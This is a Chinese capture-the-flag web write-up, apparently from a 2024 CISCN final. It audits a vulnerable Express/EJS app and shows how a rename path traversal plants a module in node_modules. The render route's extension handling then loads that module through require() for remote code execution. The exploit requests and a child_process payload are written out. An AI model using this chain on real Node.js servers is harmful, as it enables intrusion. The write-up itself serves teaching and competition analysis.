onst &#123; username, password &#125; = req.body; if (username === &#x27;admin&#x27;)&#123; return res.status(400).send(&#x27;you can not be admin&#x27;); &#125; const new_username = username.toUpperCase() if (new_username === admin.username &amp;&amp; password === admin.password) &#123; req.session.user = &quot;ADMIN&quot;; res.redirect(&#x27;/rename&#x27;); &#125; else &#123; // res.redirect(&#x27;/login&#x27;); &#125;&#125;);app.get(&#x27;/upload&#x27;, (req, res) =&gt; &#123; res.render(&#x27;upload&#x27;);&#125;);app.post(&#x27;/upload&#x27;, upload.single(&#x27;fileInput&#x27;), (req, res) =&gt; &#123; if (!req.file) &#123; return res.status(400).send(&#x27;No file uploaded&#x27;); &#125; const fileExt = path.extname(req.file.originalname).toLowerCase(); if (fileExt === &#x27;.ejs&#x27;) &#123; return res.status(400).send(&#x27;Upload of .ejs files is not allowed&#x27;); &#125; res.send(&#x27;File uploaded successfully: &#x27; + req.file.originalname);&#125;);app.get(&#x27;/render&#x27;,(req, res) =&gt; &#123; const &#123; filename &#125; = req.query; if (!filename) &#123; return res.status(400).send(&#x27;Filename parameter is required&#x27;); &#125; const filePath = path.join(__dirname, &#x27;uploads&#x27;, filename); if (filePath.endsWith(&#x27;.ejs&#x27;)) &#123; return res.status(400).send(&#x27;Invalid file type.&#x27;); &#125; res.render(filePath);&#125;);app.get(&#x27;/rename&#x27;,IfLogin, (req, res) =&gt; &#123; if (req.session.user !== &#x27;ADMIN&#x27;) &#123; return res.status(403).send(&#x27;Access forbidden&#x27;); &#125; const &#123; oldPath , newPath &#125; = req.query; if (!oldPath || !newPath) &#123; return res.status(400).send(&#x27;Missing oldPath or newPath&#x27;); &#125; if (newPath &amp;&amp; /app\.js|\\|\.ejs/i.test(newPath)) &#123; return res.status(400).send(&#x27;Invalid file name&#x27;); &#125; if (oldPath &amp;&amp; /\.\.|flag/i.test(oldPath)) &#123; return res.status(400).send(&#x27;Invalid file name&#x27;); &#125; const new_file = newPath.toLowerCase(); const oldFilePath = path.join(__dirname, &#x27;uploads&#x27;, oldPath); const newFilePath = path.join(__dirname, &#x27;uploads&#x27;, new_file); if (newFilePath.endsWith(&#x27;.ejs&#x27;))&#123; return res.status(400).send(&#x27;Invalid file type.&#x27;); &#125; if (!oldPath) &#123; return res.status(400).send(&#x27;oldPath parameter is required&#x27;); &#125; if (!fs.existsSync(oldFilePath)) &#123; return res.status(404).send(&#x27;Old file not found&#x27;); &#125; if (fs.existsSync(newFilePath)) &#123; return res.status(409).send(&#x27;New file path already exists&#x27;); &#125; createDirectoriesForFilePath(newFilePath) fs.rename(oldFilePath, newFilePath, (err) =&gt; &#123; if (err) &#123; console.error(&#x27;Error renaming file:&#x27;, err); return res.status(500).send(&#x27;Error renaming file&#x27;); &#125; res.send(&#x27;File renamed successfully&#x27;); &#125;);&#125;);app.listen(&#x27;3000&#x27;, () =&gt; &#123; console.log(`http://localhost:3000`)&#125;)
代码审计： 看到ejs和express，ejs模版注入 注入点： 当我们传入的filename没有后缀的时候，render会自动加入默认设置的.ejs，当我们传入的filename有后缀时，会取最后一个后缀进行require，假设filename=1.js.abc，那么就会require(‘abc’)，为什么会这样，我们追踪下源码，res.render处打个断点
view在没cache的情况下view变量默认是空的，就会在此处调用一个View()，而且当这个函数结束的时候，他会继续走一个tryRender函数，看View函数内容 function View(name, options) &#123; var opts = options || &#123;&#125;; this.defaultEngine = opts.defaultEngine; this.ext = extname(name); this.name = name; this.root = opts.root; if (!this.ext &amp;&amp; !this.defaultEngine) &#123; throw new Error(&#x27;No default engine was specified and no extension was provided.&#x27;); &#125; var fileName = name; if (!this.ext) &#123; // get extension from default engine name this.ext = this.defaultEngine[0] !== &#x27;.&#x27; ? &#x27;.&#x27; + this.defaultEngine : this.defaultEngine; fileName += this.ext; &#125; if (!opts.engines[this.ext]) &#123; // load engine var mod = this.ext.slice(1) debug(&#x27;require &quot;%s&quot;&#x27;, mod) // default engine export var fn = require(mod).__express if (typeof fn !== &#x27;function&#x27;) &#123; throw new Error(&#x27;Module &quot;&#x27; + mod + &#x27;&quot; does not provide a view engine.&#x27;) &#125; opts.engines[this.ext] = fn &#125; // store loaded engine this.engine = opts.engines[this.ext]; // lookup path this.path = this.lookup(fileName);&#125;
重点在这
this.ext是我们传入的最后一个后缀，去掉.传给了mod，然后被require，require默认是读取node_modules中的index.js，假设这里mod是js，那么就会require node_modules/js/index.js，也就是说我们能控制node_modules下的文件内容的话就能rce了，刚好这里的rename可以实现目录穿越写入node_modules中，我们先随便上传个index.js，内容为: const p = require(&#x27;child_process&#x27;)p.exec(&quot;calc&quot;)
然后 rename?oldPath=index.js&amp;newPath=../node_modules/F12/index.js
rce： render?filename=1.F12
fix也很简单，把.js加入黑名单就行 复制于：2024Ciscn总决赛Web Writeup - F12~ - 博客园
